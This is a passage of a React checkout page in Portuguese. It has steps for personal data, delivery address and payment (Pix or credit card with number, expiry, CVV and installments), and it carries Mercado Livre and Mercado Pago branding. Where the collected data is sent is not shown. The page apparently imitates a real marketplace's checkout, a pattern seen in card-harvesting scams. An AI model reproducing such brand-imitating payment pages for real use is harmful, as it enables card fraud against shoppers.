                  <label className="text-[13px] text-[#333] font-medium mb-1 block">Celular</label>
                  <input
                    type="text"
                    value={celular}
                    onChange={(e) => setCelular(formatPhone(e.target.value))}
                    placeholder="(00) 00000-0000"
                    className="w-full border border-[#ddd] rounded-md px-3 py-3 text-[14px] text-[#333] focus:outline-none focus:border-[#3483fa]"
                    maxLength={15}
                  />
                </div>
              </div>
            </div>

            <div className="flex items-center gap-2 mt-4 text-[12px] text-[#999]">
              <Lock size={12} />
              <span>Seus dados estão protegidos com criptografia SSL</span>
            </div>
          </div>

          <div className="mt-4">
            <button
              onClick={() => setStep(3)}
              disabled={!email.includes("@") || nome.length < 3 || cpf.replace(/\D/g, "").length !== 11 || celular.replace(/\D/g, "").length < 10}
              className={`w-full py-[14px] rounded-full font-semibold text-[16px] text-white shadow-md ${
                !email.includes("@") || nome.length < 3 || cpf.replace(/\D/g, "").length !== 11 || celular.replace(/\D/g, "").length < 10 ? "bg-[#3483fa]/40" : "bg-[#3483fa]"
              }`}
            >
              Continuar
            </button>
          </div>
        </div>
      )}

      {/* ═══ STEP 3: ENTREGA ═══ */}
      {step === 3 && (
        <div className="px-4">
          <div className="bg-white mt-4 p-5 rounded-xl shadow-sm">
            <div className="flex items-center gap-2 mb-4">
              <MapPin size={20} className="text-[#333]" />
              <h3 className="text-[16px] font-semibold text-[#333]">Endereço de entrega</h3>
            </div>

            <div className="space-y-4">
              <div>
                <label className="text-[13px] text-[#333] font-medium mb-1 block">CEP</label>
                <div className="flex gap-2">
                  <input
                    type="text"
                    value={cep}
                    onChange={(e) => { setCep(formatCep(e.target.value)); setCepFound(false); }}
                    placeholder="00000-000"
                    className="flex-1 border border-[#ddd] rounded-md px-3 py-3 text-[14px] text-[#333] focus:outline-none focus:border-[#3483fa]"
                    maxLength={9}
                  />
                  <button
                    onClick={buscarCep}
                    className="bg-[#3483fa] text-white px-5 py-3 rounded-md text-[14px] font-semibold"
                  >
                    Buscar
                  </button>
                </div>
                {cepFound && (
                  <div className="flex items-center gap-1 mt-1">
                    <CheckCircle size={13} className="text-[#00a650]" />
                    <span className="text-[12px] text-[#00a650]">Endereço encontrado</span>
                  </div>
                )}
              </div>

              <div>
                <label className="text-[13px] text-[#333] font-medium mb-1 block">Rua / Avenida</label>
                <input
                  type="text"
                  value={rua}
                  onChange={(e) => setRua(e.target.value)}
                  placeholder="Preencha o CEP acima"
                  className="w-full border border-[#ddd] rounded-md px-3 py-3 text-[14px] text-[#333] focus:outline-none focus:border-[#3483fa]"
                />
              </div>

              <div className="flex gap-3">
                <div className="w-[90px]">
                  <label className="text-[13px] text-[#333] font-medium mb-1 block">Número</label>
                  <input
                    type="text"
                    value={numero}
                    onChange={(e) => setNumero(e.target.value)}
                    placeholder="Nº"
                    className="w-full border border-[#ddd] rounded-md px-3 py-3 text-[14px] text-[#333] focus:outline-none focus:border-[#3483fa]"
                  />
                </div>
                <div className="flex-1">
                  <label className="text-[13px] text-[#333] font-medium mb-1 block">Complemento <span className="text-[#999] font-normal">(opcional)</span></label>
                  <input
                    type="text"
                    value={complemento}
                    onChange={(e) => setComplemento(e.target.value)}
                    placeholder="Apto, bloco..."
                    className="w-full border border-[#ddd] rounded-md px-3 py-3 text-[14px] text-[#333] focus:outline-none focus:border-[#3483fa]"
                  />
                </div>
              </div>

              <div>
                <label className="text-[13px] text-[#333] font-medium mb-1 block">Bairro</label>
                <input
                  type="text"
                  value={bairro}
                  onChange={(e) => setBairro(e.target.value)}
                  placeholder="—"
                  className="w-full border border-[#ddd] rounded-md px-3 py-3 text-[14px] text-[#333] focus:outline-none focus:border-[#3483fa]"
                />
              </div>

              <div className="flex gap-3">
                <div className="flex-1">
                  <label className="text-[13px] text-[#333] font-medium mb-1 block">Cidade</label>
                  <input
                    type="text"
                    value={cidade}
                    onChange={(e) => setCidade(e.target.value)}
                    placeholder="—"
                    className="w-full border border-[#ddd] rounded-md px-3 py-3 text-[14px] text-[#333] focus:outline-none focus:border-[#3483fa]"
                  />
                </div>
                <div className="w-[80px]">
                  <label className="text-[13px] text-[#333] font-medium mb-1 block">UF</label>
                  <input
                    type="text"
                    value={uf}
                    onChange={(e) => setUf(e.target.value.toUpperCase().slice(0, 2))}
                    placeholder="—"
                    className="w-full border border-[#ddd] rounded-md px-3 py-3 text-[14px] text-[#333] focus:outline-none focus:border-[#3483fa]"
                    maxLength={2}
                  />
                </div>
              </div>
            </div>
          </div>

          {/* Shipping options */}
          {cepFound && (
            <div className="bg-white mt-3 p-5 rounded-xl shadow-sm">
              <div className="flex items-center gap-2 mb-3">
                <Truck size={20} className="text-[#333]" />
                <h3 className="text-[16px] font-semibold text-[#333]">Opção de envio</h3>
              </div>
              <p className="text-[13px] text-[#999] mb-3">Envio para {cidade} - {uf}</p>

              <div className="space-y-2">
                <label className={`flex items-start gap-3 p-3 rounded-lg border cursor-pointer ${shippingOption === "full" ? "border-[#3483fa] bg-[#f0f6ff]" : "border-[#ddd]"}`}>
                  <input type="radio" checked={shippingOption === "full"} onChange={() => setShippingOption("full")} className="mt-1 accent-[#3483fa]" />
                  <div className="flex-1">
                    <div className="flex items-center gap-2">
                      <img src="/full-icon.png" alt="FULL" className="h-[18px]" />
                      <span className="text-[14px] text-[#333]">R$ 17,94</span>
                    </div>
                    <p className="text-[13px] text-[#333]">Chegará <strong>{getDayName(fullDate)}</strong></p>
                  </div>
                </label>

                <label className={`flex items-start gap-3 p-3 rounded-lg border cursor-pointer ${shippingOption === "normal" ? "border-[#3483fa] bg-[#f0f6ff]" : "border-[#ddd]"}`}>
                  <input type="radio" checked={shippingOption === "normal"} onChange={() => setShippingOption("normal")} className="mt-1 accent-[#3483fa]" />
                  <div className="flex-1">
                    <div className="flex items-center gap-2">
                      <Truck size={14} className="text-[#333]" />
                      <span className="text-[14px] text-[#333]">Normal</span>
                      <span className="text-[#00a650] font-bold text-[13px]">Grátis</span>
                    </div>
                    <p className="text-[13px] text-[#333]">Chegará entre <strong>{getDayName(normalFrom)} e {getDayName(normalTo)}</strong></p>
                  </div>
                </label>
              </div>
            </div>
          )}

          <div className="mt-4">
            <button
              onClick={() => setStep(4)}
              disabled={!cepFound || !numero || !rua || !bairro || !cidade || uf.length !== 2}
              className={`w-full py-[14px] rounded-full font-semibold text-[16px] text-white shadow-md ${
                !cepFound || !numero || !rua || !bairro || !cidade || uf.length !== 2 ? "bg-[#3483fa]/40" : "bg-[#3483fa]"
              }`}
            >
              Continuar
            </button>
          </div>
        </div>
      )}

      {/* ═══ STEP 4: PAGAMENTO ═══ */}
      {step === 4 && (
        <div className="px-4">
          <div className="bg-white rounded-xl p-5 border border-gray-200 mt-4">
            <div className="flex items-center gap-2.5 mb-1">
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-5 h-5 text-gray-700"><rect width="20" height="14" x="2" y="5" rx="2"/><line x1="2" x2="22" y1="10" y2="10"/></svg>
              <h2 className="text-lg font-bold text-gray-900">Como você quer pagar?</h2>
            </div>

            <div className="space-y-2 mt-4">
              {/* Pix */}
              <label className={`flex items-center gap-3 p-3.5 rounded-xl border-2 cursor-pointer transition-all ${payMethod === "pix" ? "border-blue-500 bg-blue-50" : "border-gray-200"}`}>
                <input type="radio" checked={payMethod === "pix"} onChange={() => setPayMethod("pix")} className="w-4 h-4 accent-blue-500" />
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-6 h-6 text-gray-600"><rect width="5" height="5" x="3" y="3" rx="1"/><rect width="5" height="5" x="16" y="3" rx="1"/><rect width="5" height="5" x="3" y="16" rx="1"/><path d="M21 16h-3a2 2 0 0 0-2 2v3"/><path d="M21 21v.01"/><path d="M12 7v3a2 2 0 0 1-2 2H7"/><path d="M3 12h.01"/><path d="M12 3h.01"/><path d="M12 16v.01"/><path d="M16 12h1"/><path d="M21 12v.01"/><path d="M12 21v-1"/></svg>
                <div className="flex-1">
                  <p className="text-sm font-medium text-gray-800">Pix</p>
                  <p className="text-xs text-gray-500">Aprovação imediata</p>
                </div>
              </label>

              {/* Card */}
              <label className={`flex items-center gap-3 p-3.5 rounded-xl border-2 cursor-pointer transition-all ${payMethod === "card" ? "border-blue-500 bg-blue-50" : "border-gray-200"}`}>
                <input type="radio" checked={payMethod === "card"} onChange={() => setPayMethod("card")} className="w-4 h-4 accent-blue-500" />
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-6 h-6 text-gray-600"><rect width="20" height="14" x="2" y="5" rx="2"/><line x1="2" x2="22" y1="10" y2="10"/></svg>
                <div className="flex-1">
                  <p className="text-sm font-medium text-gray-800">Cartão de crédito</p>
                  <p className="text-xs text-gray-500">Até 10x sem juros</p>
                </div>
                <div className="flex items-center gap-1">
                  <CardFlags size={16} />
                </div>
              </label>
            </div>

            {/* Pix info box */}
            {payMethod === "pix" && (
              <div className="mt-4 p-3.5 rounded-xl border" style={{ backgroundColor: "rgb(232, 245, 233)", borderColor: "rgb(165, 214, 167)" }}>
                <div className="flex items-center gap-2">
                  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-5 h-5" style={{ color: "rgb(0, 166, 80)" }}><rect width="5" height="5" x="3" y="3" rx="1"/><rect width="5" height="5" x="16" y="3" rx="1"/><rect width="5" height="5" x="3" y="16" rx="1"/><path d="M21 16h-3a2 2 0 0 0-2 2v3"/><path d="M21 21v.01"/><path d="M12 7v3a2 2 0 0 1-2 2H7"/><path d="M3 12h.01"/><path d="M12 3h.01"/><path d="M12 16v.01"/><path d="M16 12h1"/><path d="M21 12v.01"/><path d="M12 21v-1"/></svg>
                  <div>
                    <p className="text-sm font-bold" style={{ color: "rgb(0, 166, 80)" }}>Pague com Pix</p>
                    <p className="text-xs text-gray-600">O código Pix será gerado ao confirmar</p>
                  </div>
                </div>
              </div>
            )}

            {/* Card form */}
            {payMethod === "card" && (
              <div className="mt-4 border-t border-[#eee] pt-4">
                <div className="mb-3">
                  <h4 className="text-[14px] font-semibold text-[#333]">Dados do cartão</h4>
                </div>
                <div className="space-y-3">
                  <div>
                    <label className="text-[13px] text-[#333] font-medium mb-1 block">Nome no cartão</label>
                    <input
                      type="text"
                      value={cardName}
                      onChange={(e) => setCardName(e.target.value.toUpperCase())}
                      placeholder="Nome completo no cartão"
                      className="w-full border border-[#ddd] rounded-md px-3 py-3 text-[14px] text-[#333] focus:outline-none focus:border-[#3483fa]"
                    />
                  </div>
                  <div>
                    <label className="text-[13px] text-[#333] font-medium mb-1 block">Número do cartão</label>
                    <div className="relative">
                      <input
                        type="text"
                        value={cardNumber}
                        onChange={(e) => setCardNumber(formatCard(e.target.value))}
                        placeholder="1234 1234 1234 1234"
                        className="w-full border border-[#ddd] rounded-md px-3 py-3 text-[14px] text-[#333] focus:outline-none focus:border-[#3483fa] pr-20"
                        maxLength={19}
                      />
                      <div className="absolute right-3 top-1/2 -translate-y-1/2">
                        {detectCardBrand(cardNumber) ? (
                          <img src={detectCardBrand(cardNumber)!.src} alt={detectCardBrand(cardNumber)!.alt} className="h-6 w-auto object-contain" />
                        ) : (
                          <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ccc" strokeWidth="1.5"><rect width="20" height="14" x="2" y="5" rx="2"/><line x1="2" x2="22" y1="10" y2="10"/></svg>
                        )}
                      </div>
                    </div>
                  </div>
                  <div className="flex gap-3">
                    <div className="flex-1">
                      <label className="text-[13px] text-[#333] font-medium mb-1 block">Data de validade</label>
                      <input
                        type="text"
                        value={cardExpiry}
                        onChange={(e) => setCardExpiry(formatExpiry(e.target.value))}
                        placeholder="MM / AA"
                        className="w-full border border-[#ddd] rounded-md px-3 py-3 text-[14px] text-[#333] focus:outline-none focus:border-[#3483fa]"
                        maxLength={5}
                      />
                    </div>
                    <div className="flex-1">
                      <label className="text-[13px] text-[#333] font-medium mb-1 block">CVV</label>
                      <input
                        type="text"
                        value={cardCvv}
                        onChange={(e) => setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
                        placeholder="CVC"
                        className="w-full border border-[#ddd] rounded-md px-3 py-3 text-[14px] text-[#333] focus:outline-none focus:border-[#3483fa]"
                        maxLength={4}
                      />
                    </div>
                  </div>
                  <div>
                    <label className="text-[13px] text-[#333] font-medium mb-1 block">Parcelas</label>
                    <button
                      onClick={() => setShowParcelas(!showParcelas)}
                      className="w-full border border-[#ddd] rounded-md px-3 py-3 text-[14px] text-[#333] flex items-center justify-between"
                    >
                      <span>{parcelas}x de R$ {formatMoney(data.price / parseInt(parcelas))} sem juros</span>
                      <ChevronLeft size={16} className={`transition-transform ${showParcelas ? "rotate-90" : "-rotate-90"}`} />
                    </button>
                    {showParcelas && (
                      <div className="border border-t-0 border-[#ddd] rounded-b-md max-h-[200px] overflow-y-auto">
                        {Array.from({ length: 10 }, (_, i) => i + 1).map((n) => (
                          <button
                            key={n}
                            onClick={() => { setParcelas(String(n)); setShowParcelas(false); }}
                            className={`w-full text-left px-3 py-3 text-[13px] border-b border-[#f0f0f0] last:border-0 ${
                              parcelas === String(n) ? "bg-[#f0f6ff] text-[#3483fa]" : "text-[#333]"
                            }`}
                          >
                            {n}x de R$ {formatMoney(data.price / n)} sem juros
                          </button>
                        ))}
                      </div>
                    )}
                  </div>
                  <div className="flex items-center gap-2 text-[12px] text-[#999]">
                    <ShieldCheck size={14} className="text-[#32bcad]" />
                    <span>Pagamento processado pelo <strong className="text-[#3483fa]">Mercado Pago</strong> · 100% seguro</span>
                  </div>
                </div>
              </div>
            )}
          </div>

          {/* Summary: user info */}
          <div className="bg-white mt-3 p-5 rounded-xl shadow-sm">
            <div className="flex items-start gap-3 pb-4 border-b border-[#f0f0f0]">
              <div className="w-[36px] h-[36px] rounded-full bg-[#f0f0f0] flex items-center justify-center shrink-0">
                <User size={18} className="text-[#999]" />
              </div>
              <div>
                <p className="text-[15px] font-semibold text-[#333]">{nome}</p>
                <p className="text-[13px] text-[#999]">CPF {cpf}</p>
              </div>
            </div>

            <p className="text-[12px] text-[#999] mt-3 mb-2">Detalhe da entrega</p>
            <div className="flex items-start gap-3 pb-4 border-b border-[#f0f0f0]">
              <div className="w-[28px] h-[28px] rounded-full border border-[#ddd] flex items-center justify-center shrink-0 mt-0.5">
                <MapPin size={14} className="text-[#999]" />
              </div>
              <div>
                <p className="text-[15px] font-semibold text-[#333]">{rua} {numero}</p>
                <p className="text-[12px] text-[#999]">Envio no meu endereço</p>
              </div>
            </div>

            <div className="flex gap-3 items-start pt-4">
              <img src={data.image} alt="" className="w-[48px] h-[48px] object-contain bg-[#f9f9f9] rounded-lg p-1" />
              <div>
                <div className="flex items-center gap-1.5 text-[#00a650] mb-1">
                  <Truck size={13} />
                  <span className="text-[13px] font-semibold">
                    Chegará {shippingOption === "full" ? getDayName(fullDate) : `entre ${getDayName(normalFrom)} e ${getDayName(normalTo)}`}
                  </span>
                </div>
                <p className="text-[13px] text-[#333] line-clamp-2">{data.title}</p>
                <p className="text-[12px] text-[#999] mt-0.5">{data.variantLabel}: {data.variant} · Quantidade: 1</p>
              </div>
            </div>
          </div>

          {/* Totals */}
          <div className="bg-white mt-3 p-5 rounded-xl shadow-sm">
            <div className="flex items-center justify-between mb-2">
              <span className="text-[14px] text-[#333]">Produtos (1)</span>
              <span className="text-[14px] text-[#333]">R$ {formatMoney(data.price)}</span>
            </div>
            <div className="flex items-center justify-between mb-3">
              <span className="text-[14px] text-[#333]">Frete</span>
              <span className={`text-[14px] ${shippingCost === 0 ? "text-[#00a650] font-bold" : "text-[#333]"}`}>
                {shippingCost === 0 ? "Grátis" : `R$ ${formatMoney(shippingCost)}`}
              </span>
            </div>
            <div className="flex items-center justify-between border-t border-[#eee] pt-3">
              <span className="text-[16px] font-bold text-[#333]">Total</span>
              <span className="text-[20px] font-bold text-[#333]">R$ {formatMoney(total)}</span>
            </div>
          </div>

          {/* Savings */}
          <div className="mt-3 bg-[#e8f8e8] px-5 py-3 rounded-xl shadow-sm flex items-center gap-2">
            <CheckCircle size={18} className="text-[#00a650]" />
            <span className="text-[14px] text-[#00a650] font-medium">Você está economizando R$ {formatMoney(savings)}</span>
          </div>

          {/* Error message */}
          {paymentError && (
            <div className="mt-3 bg-red-50 border border-red-200 rounded-xl px-4 py-3">
              <p className="text-[13px] text-red-600">{paymentError}</p>
            </div>
          )}

          {/* Confirm */}
          <div className="mt-4">
            <button
              onClick={handleConfirm}
              disabled={processing}
              className={`w-full py-[14px] rounded-full font-semibold text-[16px] text-white shadow-md ${
                processing ? "bg-[#00a650]/60" : "bg-[#00a650]"
              }`}
            >
              {processing ? (
                <span className="flex items-center justify-center gap-2">
                  <span className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                  Processando...
                </span>
              ) : (
                "Confirmar compra"
              )}
            </button>
          </div>

          <p className="text-center text-[12px] text-[#999] mt-3 flex items-center justify-center gap-1">
            <ShieldCheck size={13} className="text-[#00a650]" />
            Compra 100% segura <Lock size={11} />
          </p>
        </div>
      )}

      {/* Footer */}
      <p className="text-center text-[11px] text-[#999] mt-6">Mercado Livre © 2026 · ◎ Pagamento seguro</p>
    </div>
  );
};

export default Checkout;
